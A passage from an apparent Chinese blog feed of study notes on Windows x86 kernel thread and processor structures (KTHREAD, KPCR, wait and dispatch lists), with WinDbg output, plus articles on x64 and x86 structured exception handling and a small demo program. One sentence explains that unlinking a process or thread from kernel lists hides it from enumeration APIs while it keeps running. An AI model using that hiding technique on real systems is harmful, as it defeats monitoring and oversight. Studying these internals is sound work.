Ptr32 Void 线程环境块 大小4KB,位于用户地址空间 用户态fs:0指向Teb</span><br><span class="line"></span><br><span class="line">  * +0x02c DebugActive      : UChar 如果值为-1，将不能使用调试寄存器：Dr0 - Dr7</span><br><span class="line"></span><br><span class="line">  * +0x034 ApcState         : _KAPC_STATE</span><br><span class="line"></span><br><span class="line">    +0x0e8 ApcQueueLock     : Uint4B</span><br><span class="line"></span><br><span class="line">    +0x138 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line"></span><br><span class="line">    +0x14c SavedApcState    : _KAPC_STATE//与APC相关</span><br><span class="line"></span><br><span class="line">  * +0x02d State            : UChar 线程状态：就绪/等待/运行 waiting/ready/running</span><br><span class="line"></span><br><span class="line">  * +0x06c BasePriority     : Char 初始值是所属进程的BasePriority值(KPROCESS-&gt;BasePriority)，可以通过KeSetBasePriorityThread()函数重新设定</span><br><span class="line"></span><br><span class="line">  * +0x070 WaitBlock        : [4] _KWAIT_BLOCK 当前线程在进行同步时等待了哪些个对象（WaitForSingleObject）</span><br><span class="line"></span><br><span class="line">  * +0x0e0 ServiceTable     : Ptr32 Void 系统服务表基址</span><br><span class="line"></span><br><span class="line">  * +0x134 TrapFrame        : Ptr32 _KTRAP_FRAME 保存进0环时的环境</span><br><span class="line"></span><br><span class="line">  * +0x140 PreviousMode     : Char 先前模式，指示程序是0环调用还是3环调用的。某些内核函数会判断程序是0环调用还是3环调用的</span><br><span class="line"></span><br><span class="line">  * +0x1b0 ThreadListEntry  : _LIST_ENTRY **和** **ETHREAD** +0x22c ThreadListEntry  : _LIST_ENTRY 一个进程所有的线程都挂在这个链表中，两个链表是一样的(之所以有两个只是为了方便)，验证两个链表是否是同一个时要注意链表节点指向结构体的偏移不同(对于ETHREAD结构体第一个链表减去0x1B0得到ETHREAD开头，第二个链表需要减去0x22c)</span><br><span class="line"></span><br><span class="line">    ![image-20231109194134624](Windows-Kernel-X86-process-thread/image-20231109194134624.png)</span><br><span class="line"></span><br><span class="line">* +0x1ec Cid              : _CLIENT_ID </span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    _CLIENT_ID</span><br><span class="line">    +0x000 UniqueProcess    : Ptr32 Void //进程ID</span><br><span class="line">    +0x004 UniqueThread     : Ptr32 Void //线程ID</span><br></pre></td></tr></table></figure></li></ul></li><li><p>+0x220 ThreadsProcess   : Ptr32 _EPROCESS 指向自己所属进程的EPROCESS结构体地址</p></li></ul><h2 id="CPU控制区结构体"><a href="#CPU控制区结构体" class="headerlink" title="CPU控制区结构体"></a>CPU控制区结构体</h2><p><strong>KPCR结构体</strong> 内核态fs:0指向KPCR 一个核一个kpcr，存储了<code>CPU</code>常用数据的副本(主要是为了快)，用的时候直接查kpcr，而不是线程进程结构体，每次切换线程时会把线程信息更新到当前kpcr结构体里</p><ul><li><p>+0x000 NtTib            : _NT_TIB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD<span class="comment">//当前线程内核异常链表</span></span><br><span class="line">+<span class="number">0x004</span> StackBase        : Ptr32 Void<span class="comment">//当前线程内核栈的基址</span></span><br><span class="line">+<span class="number">0x008</span> StackLimit       : Ptr32 Void<span class="comment">//当前线程栈边界(栈可以到达的最低点)</span></span><br><span class="line">+<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">+<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">+<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">+<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">+<span class="number">0x018</span> Self             : Ptr32 _NT_TIB<span class="comment">//指向NtTib自己，类似于c++的this指针</span></span><br></pre></td></tr></table></figure></li><li><p>+0x01c SelfPcr          : Ptr32 _KPCR 指向KPCR自己，类似于c++的this指针</p></li><li><p>+0x020 Prcb             : Ptr32 _KPRCB 指向下面拓展结构体PrcbData的指针</p></li><li><p>+0x120 PrcbData         : _KPRCB</p></li><li><p>+0x038 IDT              : Ptr32 _KIDTENTRY IDT表基址</p></li><li><p>+0x03c GDT              : Ptr32 _KGDTENTRY GDT表基址</p></li><li><p>+0x040 TSS              : Ptr32 _KTSS 指向<code>TSS</code>的指针，每个<code>CPU</code>都有一个<code>TSS</code>。</p></li><li><p>+0x051 Number           : UChar CPU编号</p></li><li><p>+0x120 PrcbData         : _KPRCB</p><ul><li>+0x004 CurrentThread    : Ptr32 _KTHREAD 当前正在运行线程结构体指针</li><li>+0x008 NextThread       : Ptr32 _KTHREAD 即将切换的下一个线程结构体指针</li><li>+0x00c IdleThread       : Ptr32 _KTHREAD 如果没有要即将切换线程要跑的空闲线程结构体指针</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock l1</span><br><span class="line"><span class="number">80553e40</span>  ffdff120</span><br><span class="line">kd&gt; dt _KPCR ffdff120<span class="number">-0x120</span></span><br><span class="line">nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : <span class="number">0xffdff000</span> _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : <span class="number">0xffdff120</span> _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x028 IRR              : 0</span></span><br><span class="line"><span class="string">   +0x02c IrrActive        : 0</span></span><br><span class="line"><span class="string">   +0x030 IDR              : 0xffffffff</span></span><br><span class="line"><span class="string">   +0x034 KdVersionBlock   : 0x80546ab8 Void</span></span><br><span class="line"><span class="string">   +0x038 IDT              : 0x8003f400 _KIDTENTRY</span></span><br><span class="line"><span class="string">   +0x03c GDT              : 0x8003f000 _KGDTENTRY</span></span><br><span class="line"><span class="string">   +0x040 TSS              : 0x80042000 _KTSS</span></span><br><span class="line"><span class="string">   +0x044 MajorVersion     : 1</span></span><br><span class="line"><span class="string">   +0x046 MinorVersion     : 1</span></span><br><span class="line"><span class="string">   +0x048 SetMember        : 1</span></span><br><span class="line"><span class="string">   +0x04c StallScaleFactor : 0xc7a</span></span><br><span class="line"><span class="string">   +0x050 DebugActive      : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x051</span> Number           : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x052 Spare0           : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : <span class="number">0x8</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x054 VdmAlert         : 0</span></span><br><span class="line"><span class="string">   +0x058 KernelReserved   : [14] 0</span></span><br><span class="line"><span class="string">   +0x090 SecondLevelCacheSize : 0x80000</span></span><br><span class="line"><span class="string">   +0x094 HalReserved      : [16] 0</span></span><br><span class="line"><span class="string">   +0x0d4 InterruptMode    : 0</span></span><br><span class="line"><span class="string">   +0x0d8 Spare1           : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">8003f</span>400</span><br><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; r tr</span><br><span class="line">tr=<span class="number">00000028</span></span><br><span class="line">kd&gt; .formats tr</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">00000028</span></span><br><span class="line">  Decimal: <span class="number">40</span></span><br><span class="line">  Decimal (<span class="type">unsigned</span>) : <span class="number">40</span></span><br><span class="line">  Octal:   <span class="number">00000000050</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00101000</span> <span class="comment">//得出tss段选择子101b=5</span></span><br><span class="line">  Chars:   ...(</span><br><span class="line">  Time:    Thu Jan  <span class="number">1</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">40</span> <span class="number">1970</span></span><br><span class="line">  Float:   low <span class="number">5.60519e-044</span> high <span class="number">0</span></span><br><span class="line">  Double:  <span class="number">1.97626e-322</span></span><br><span class="line">kd&gt; dq @gdtr+<span class="number">8</span>*<span class="number">5</span> l1</span><br><span class="line"><span class="number">8003f</span>028  <span class="number">80008b</span>04`<span class="number">200020</span>ab<span class="comment">//tss基址80042000</span></span><br></pre></td></tr></table></figure><h2 id="等待链表与调度链表"><a href="#等待链表与调度链表" class="headerlink" title="等待链表与调度链表"></a>等待链表与调度链表</h2><h3 id="等待链表"><a href="#等待链表" class="headerlink" title="等待链表"></a>等待链表</h3><p>对<strong>EPROCESS</strong>和<strong>ETHREAD</strong>结构体进行进程断链或者线程断链，只是遍历系统进程的API遍历不到了，但是进程线程依旧可以执行，对于进程来说CPU执行与调度是基于线程的，对于线程说明CPU调度线程的时候压根不用这些链表</p><p>等待链表由全局变量KiWaitListHead指定位置存储链表，指向的位置就是ETHREAD.KTHREAD+0x060 WaitListEntry**:**_LIST_ENTRY</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KiWaitListHead</span><br><span class="line"><span class="number">80553</span>d88  <span class="number">81613b</span>90 <span class="number">813261</span>d8 <span class="number">00000011</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553</span>d98  e57a42bd d6bf94d5 <span class="number">01000013</span> ffdff980</span><br><span class="line"><span class="number">80553</span>da8  ffdff980 <span class="number">80500</span>df0 <span class="number">00000000</span> <span class="number">000655</span>d8</span><br><span class="line"><span class="number">80553</span>db8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">80553</span>dc0 <span class="number">80553</span>dc0</span><br><span class="line"><span class="number">80553</span>dc8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">80553</span>dd0 <span class="number">80553</span>dd0</span><br><span class="line"><span class="number">80553</span>dd8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">817b</span>6b30</span><br><span class="line"><span class="number">80553</span>de8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00040001</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553</span>df8  <span class="number">817b</span>6ba0 <span class="number">817b</span>6ba0 <span class="number">00000001</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; dt _KTHREAD <span class="number">81613b</span>90<span class="number">-0x60</span></span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> MutantListHead   : _LIST_ENTRY [ <span class="number">0x81613b40</span> - <span class="number">0x81613b40</span> ]</span><br></pre></td></tr></table></figure><h3 id="调度链表"><a href="#调度链表" class="headerlink" title="调度链表"></a>调度链表</h3><p>调度链表有32个圈，圈中包括正在运行的和准备运行的。，就是优先级是<code>0-31</code>，0为最低优先级，31为最高，默认优先级一般是8。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>x64 SEH分析</title>
      <link href="/2023/11/08/SEH-x64/"/>
      <url>/2023/11/08/SEH-x64/</url>
      
        <content type="html"><![CDATA[<p>一些结构体描述都可以在这里找到–&gt; <a href="https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-160">https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-160</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line">    <span class="comment">// 这里是被保护的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except (过滤器表达式) &#123; <span class="comment">//异常过滤</span></span><br><span class="line">   <span class="comment">// 异常处理程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验文件</p><p>链接：<a href="https://pan.baidu.com/s/1jjJIoFOLP_gWYzui0pNqjg">https://pan.baidu.com/s/1jjJIoFOLP_gWYzui0pNqjg</a><br>提取码：5anj</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;filter\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">exc</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = x / x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        __try &#123;</span><br><span class="line">            exc();</span><br><span class="line">        &#125;</span><br><span class="line">        __finally &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;111\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (filter()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;222\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">filter</span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">222</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><h3 id="ExceptionDirectory"><a href="#ExceptionDirectory" class="headerlink" title="ExceptionDirectory"></a>ExceptionDirectory</h3><p>x64 seh不再基于栈，效率高也安全，编译进了pe文件里的OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]即第三项异常表,RVA指向的是一个IMAGE_IA64_RUNTIME_FUNCTION_ENTRY的结构体数组<img src="/2023/11/08/SEH-x64/image-20231108143547506.png" alt="image-20231108143547506"></p><p>根据上方VirtualAddress在SectionHeaders里找到位置在.pdata节</p><p><img src="/2023/11/08/SEH-x64/image-20231108143712472.png" alt="image-20231108143712472"></p><p>计算出在pe文件里地址为7200h</p><p><img src="/2023/11/08/SEH-x64/image-20231108143755950.png" alt="image-20231108143755950"></p><p>ida里已经帮我们分析好了(对着函数找交叉引用就可以找到)</p><p><img src="/2023/11/08/SEH-x64/image-20231108144111996.png" alt="image-20231108144111996"></p><h3 id="RUNTIME-FUNCTION-结构体"><a href="#RUNTIME-FUNCTION-结构体" class="headerlink" title="RUNTIME_FUNCTION 结构体"></a><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-runtime_function">RUNTIME_FUNCTION 结构体</a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span>  _IMAGE_RUNTIME_FUNCTION_ENTRY  IMAGE_IA64_RUNTIME_FUNCTION_ENTRY;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RUNTIME_FUNCTION_ENTRY</span> &#123;</span></span><br><span class="line">  DWORD BeginAddress;<span class="comment">//函数开头的地址RVA</span></span><br><span class="line">  DWORD EndAddress;<span class="comment">//函数末尾的地址RVA</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD UnwindInfoAddress;</span><br><span class="line">    DWORD UnwindData;</span><br><span class="line">  &#125; DUMMYUNIONNAME;<span class="comment">//描述上方指定函数异常处理和调用堆栈展开信息的地址RVA</span></span><br><span class="line">&#125; RUNTIME_FUNCTION, *PRUNTIME_FUNCTION, _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY;</span><br></pre></td></tr></table></figure><p>每个非叶函数至少对应一个 RUNTIME FUCNTION结构体</p><blockquote><p>x64里的叶函数:既不调用函数、又没有修改栈指针，也没有使用 SEH</p></blockquote><p>DUMMYUNIONNAME成员指向了_UNWIND_INFO</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNWIND_INFO</span> &#123;</span></span><br><span class="line">    UCHAR Version : <span class="number">3</span>;</span><br><span class="line">    UCHAR Flags : <span class="number">5</span>;</span><br><span class="line">    UCHAR SizeOfProlog;</span><br><span class="line">    UCHAR CountOfCodes;</span><br><span class="line">    UCHAR FrameRegister : <span class="number">4</span>;</span><br><span class="line">    UCHAR FrameOffset : <span class="number">4</span>;</span><br><span class="line">    UNWIND_CODE UnwindCode[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The unwind codes are followed by an optional DWORD aligned field that</span></span><br><span class="line">    <span class="comment">// contains the exception handler address or a function table entry if</span></span><br><span class="line">    <span class="comment">// chained unwind information is specified. If an exception handler address</span></span><br><span class="line">    <span class="comment">// is specified, then it is followed by the language specified exception</span></span><br><span class="line">    <span class="comment">// handler data.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//  union &#123;</span></span><br><span class="line">    <span class="comment">//      struct &#123;</span></span><br><span class="line">    <span class="comment">//          ULONG ExceptionHandler;</span></span><br><span class="line">    <span class="comment">//          ULONG ExceptionData[];</span></span><br><span class="line">    <span class="comment">//      &#125;;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//      RUNTIME_FUNCTION FunctionEntry;</span></span><br><span class="line">    <span class="comment">//  &#125;;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">&#125; UNWIND_INFO, *PUNWIND_INFO;</span><br></pre></td></tr></table></figure><p><strong>Version</strong></p><p>展开数据的版本号,目前都是1</p><p><strong>Flags</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNW_FLAG_NHANDLER       0x0 <span class="comment">//该函数没有过滤器表达式也没有异常处理程序即不对异常进行处理，抛给上层</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNW_FLAG_EHANDLER       0x1 <span class="comment">//该函数有过滤器表达式和异常处理程序处理异常</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNW_FLAG_UHANDLER       0x2 <span class="comment">//该函数有finally块</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNW_FLAG_CHAININFO      0x4 <span class="comment">//该函数有多个 UNWIND_INFO，它们串接在一起</span></span></span><br></pre></td></tr></table></figure><p>对于不同Flags后面UnwindCode是不同的</p><ul><li><p><strong>UNW_FLAG_NHANDLER</strong></p><p>后面是常规UnwindCode，直接回滚，抛给上层函数</p><p>比如exc函数的_UNWIND_INFO</p><p><img src="/2023/11/08/SEH-x64/image-20231108225901821.png" alt="image-20231108225901821"></p></li><li><p><strong>UNW_FLAG_EHANDLER</strong> 或者 <strong>UNW_FLAG_UHANDLER</strong></p><p>除了后面是常规UnwindCode，最后一个 UNWIND_CODE 之后存放着 ExceptionHandler（相当于 x86 EXCEPTION_REGISTRATION::handler）和 ExceptionData（相当于 x86 EXCEPTION_REGISTRATION::scopetable）。</p><p><img src="/2023/11/08/SEH-x64/image-20231108230240059.png" alt="image-20231108230240059"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SCOPE_TABLE</span> &#123;</span></span><br><span class="line">    ULONG Count;<span class="comment">//ScopeRecord 数组的个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG BeginAddress;<span class="comment">//表示某个 __try 保护域的范围</span></span><br><span class="line">        ULONG EndAddress;<span class="comment">//表示某个 __try 保护域的范围</span></span><br><span class="line">        ULONG HandlerAddress;</span><br><span class="line">        ULONG JumpTarget;<span class="comment">//对于 __try/__except 组合，HandlerAddress 代表 EXCEPT_FILTER，JumpTarget 代表 EXCEPT_HANDLER。</span></span><br><span class="line">                         <span class="comment">// 对于 __try/__finally 组合，HandlerAddress 代表 FINALLY_HANDLER，JumpTarget 等于 0。</span></span><br><span class="line">    &#125; ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125; SCOPE_TABLE, *PSCOPE_TABLE;</span><br></pre></td></tr></table></figure></li><li><p><strong>UNW_FLAG_CHAININFO</strong></p><p>除了后面是常规UnwindCode，最后一个 UNWIND_CODE之后，指向了一个_RUNTIME_FUNCTION结构体，形成了链式结构</p></li></ul><p><strong>SizeOfProlog</strong></p><p>该函数的 Prolog 指令的大小，单位是 byte</p><p><strong>CountOfCodes</strong></p><p>下方UWIND_CODE数组成员个数</p><p><strong>FrameRegister</strong> TODO</p><p><strong>FrameOffset</strong> TODO</p><p><strong>UnwindCode</strong></p><hr><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">FrameOffset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        UCHAR CodeOffset;</span><br><span class="line">        UCHAR UnwindOp : <span class="number">4</span>;</span><br><span class="line">        UCHAR OpInfo : <span class="number">4</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    USHORT FrameOffset;</span><br><span class="line">&#125; UNWIND_CODE, *PUNWIND_CODE;</span><br></pre></td></tr></table></figure><ul><li><p>CodeOffset 需要unwind位置在Prolog里的偏移</p></li><li><p>UnwindOp 表明怎么做unwind的类型</p><ul><li>UWOP_ALLOC_SMALL 0x2 表示在堆栈上分配一个小区域 sub esp之类的操作</li><li>UWOP_PUSH_NONVOL 0 表示压入一个非易失性整数寄存器</li></ul></li><li><p>OpInfo 根据UnwindOp不同有不同含义</p><ul><li><p>UWOP_ALLOC_SMALL 分配了OpInfo* 8 + 8大小栈</p></li><li><p>UWOP_PUSH_NONVOL push压入寄存器的标号</p><p><img src="/2023/11/08/SEH-x64/image-20231108222855349.png" alt="image-20231108222855349"></p></li></ul></li></ul><h3 id="exec-异常回滚过程"><a href="#exec-异常回滚过程" class="headerlink" title="exec()异常回滚过程"></a>exec()异常回滚过程</h3><p>首先找到exec函数的RUNTIME_FUNCTION的UNWIND_INFO结构体</p><p><img src="/2023/11/08/SEH-x64/image-20231109000315377.png" alt="image-20231109000315377"></p><p>FLAGS&#x3D;0&#x3D;UNW_FLAG_NHANDLER，不处理异常，根据UNWIND_CODE回滚</p><p><img src="/2023/11/08/SEH-x64/image-20231109000550567.png" alt="image-20231109000550567"></p><p>首先和SizeOfProlog比较，如果大于等于，直接所有_UNWIND_INFO按照顺序都回滚即可，否则就需要和每一个_UNWIND_INFO.CodeOffset比较看哪一个需要回滚</p><p>本例中异常发送处超过SizeOfProlog&#x3D;4就把rsp加上(2+1)*8&#x3D;0x18,然后根据函数调用栈找到main，找到main函数的RUNTIME_FUNCTION的UNWIND_INFO结构体</p><p><img src="/2023/11/08/SEH-x64/image-20231109000915133.png" alt="image-20231109000915133"></p><p>异常发送处都在两个_SCOPE_TABLE的try块范围中，两个都处理异常，要处理就不需要回滚了</p><p>第一个是JmpTarget是0，所以是finally，在此处进行记录。直到找到filter接管后，再执行finally再EXCEPT*_HANDLER*</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.pediy.com/kssd/pediy12/142371.html">https://www.pediy.com/kssd/pediy12/142371.html</a></p><p><a href="https://www.bilibili.com/video/BV1tJ411M7kd">https://www.bilibili.com/video/BV1tJ411M7kd</a></p><p><a href="https://www.anquanke.com/post/id/247688">https://www.anquanke.com/post/id/247688</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>x86 SEH分析</title>
      <link href="/2023/11/02/SEH-x86/"/>
      <url>/2023/11/02/SEH-x86/</url>
      
        <content type="html"><![CDATA[<p>1997年的一篇文章感觉依旧封神，用户态掺杂内核分析,当时未公开的一些资料，似乎现在微软已经公开</p><p><a href="https://blog.csdn.net/chenlycly/article/details/52575260">https://blog.csdn.net/chenlycly/article/details/52575260</a></p><p>2011年boxcounter佬的一篇文章从内核模式分析 </p><p><a href="https://github.com/boxcounter/boxcounter.github.io/raw/master/attachments/SEH%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88x86%E7%AF%87%EF%BC%89_v1.0.2.zip">https://github.com/boxcounter/boxcounter.github.io/raw/master/attachments/SEH%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88x86%E7%AF%87%EF%BC%89_v1.0.2.zip</a></p><blockquote><p>TODO: 两篇文章都没看完，有空再来二周目</p></blockquote><h2 id="操作系统原生"><a href="#操作系统原生" class="headerlink" title="操作系统原生"></a>操作系统原生</h2><p>当一个线程出现错误时，操作系统传递参数并调用用户定义的一个回调函数</p><p>回调函数样子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler( <span class="keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">                        <span class="type">void</span> * EstablisherFrame,</span><br><span class="line">                        <span class="keyword">struct</span> _CONTEXT *ContextRecord,</span><br><span class="line">                        <span class="type">void</span> * DispatcherContext);</span><br></pre></td></tr></table></figure><p><strong><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record">参数1</a></strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;<span class="comment">//异常发生的原因</span></span><br><span class="line">    DWORD ExceptionFlags;<span class="comment">//包含零个或多个异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span><span class="comment">//方便在发生嵌套异常时提供附加信息</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//发生异常的地址</span></span><br><span class="line">    DWORD NumberParameters;<span class="comment">//指示与异常相关的附加参数的数量，就是下面的这个</span></span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];<span class="comment">//异常相关的附加参数数组</span></span><br><span class="line">    &#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p><strong>参数2</strong></p><p>指向establisher帧结构的指针 TODO</p><p><strong>参数3</strong></p><p>CONTEXT结构体指针保存特定线程的寄存器上下文，用于SEH时，CONTEXT结构表示异常发生时寄存器的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _context</span><br><span class="line">nt!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : Uint4B<span class="comment">//用来控制哪些寄存器需要保存</span></span><br><span class="line">   +<span class="number">0x004</span> Dr0              : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Dr1              : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> Dr2              : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> Dr3              : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> Dr6              : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Dr7              : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SegFs            : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> SegEs            : Uint4B</span><br><span class="line">   +<span class="number">0x098</span> SegDs            : Uint4B</span><br><span class="line">   +<span class="number">0x09c</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a0</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a4</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x0a8</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x0b0</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x0b4</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x0b8</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x0c4</span> Esp              : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>] UChar</span><br></pre></td></tr></table></figure><p><strong>参数4</strong></p><p>TODO</p><p><strong>返回值</strong></p><p>最后都要返回一个值来告诉系统下一步做什么</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExecution,<span 